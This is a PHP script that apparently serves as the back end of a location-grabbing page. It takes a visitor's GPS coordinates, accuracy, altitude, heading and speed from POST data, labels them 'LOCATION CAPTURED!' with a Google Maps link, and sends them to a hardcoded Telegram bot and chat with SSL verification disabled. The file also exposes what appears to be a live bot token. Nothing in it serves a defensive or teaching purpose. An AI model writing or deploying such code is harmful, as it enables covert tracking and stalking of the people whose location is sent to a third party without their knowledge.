<?php

$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM"; 
$chatId = "-1003598938463";     


// Receive Data
$lat = $_POST['Lat'];
$lon = $_POST['Lon'];
$acc = $_POST['Acc'];
$alt = $_POST['Alt'];
$dir = $_POST['Dir'];
$spd = $_POST['Spd'];
$status = $_POST['Status'];

// Generate Google Maps Link
$googleMapsLink = "https://www.google.com/maps?q=" . $lat . "," . $lon;

// Format Message
$acc_clean = round($acc, 1); 
if ($alt < 0) {
    $alt_text = round(abs($alt), 0) . " m below sea level";
} else {
    $alt_text = round($alt, 0) . " m above sea level";
}

// --- 2. CREATE THE MESSAGE ---
$message = "<b>📍 LOCATION CAPTURED!</b>\n\n";

$message .= "<b>🌎 Latitude:</b> <code>" . $lat . "°</code>\n";
$message .= "<b>🌎 Longitude:</b> <code>" . $lon . "°</code>\n";
$message .= "<b>🎯 Accuracy:</b> <code>" . $acc_clean . " m</code>\n";
$message .= "<b>🏔 Altitude:</b> " . $alt_text . "\n"; 
$message .= "<b>🧭 Direction:</b> " . $dir . "\n";
$message .= "<b>🚗 Speed:</b> " . $spd . "\n\n";
$message .= "<b>🗺️ <a href='" . $googleMapsLink . "'>Open in Google Maps</a></b>";

// Send to Telegram
$website = "https://api.telegram.org/bot" . $botToken;
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML',
    'disable_web_page_preview' => true
];

$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
 
?>
